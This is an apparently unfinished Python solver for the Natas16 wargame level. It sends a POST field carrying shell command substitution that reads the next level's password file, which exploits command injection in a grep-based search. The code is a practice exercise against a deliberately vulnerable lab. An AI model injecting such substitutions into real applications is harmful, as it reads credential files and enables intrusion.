from natas import Natas

natas = Natas('natas16')

# grep -i ". /etc/natas_webpass/natas17 " dictionaty.txt


def sleep_char_at_idx(idx: int):
    idx = str(idx)
    post = {'needle': '''$(
            my_pass=$(cat /etc/natas_webpass/natas17)
            my_index='''+idx+'''
            len=${#my_pass}
            (( biggest_ix=len-1 ))
            )'''}

    response = natas.get_response(post_data=post)
    print(response.prettify())
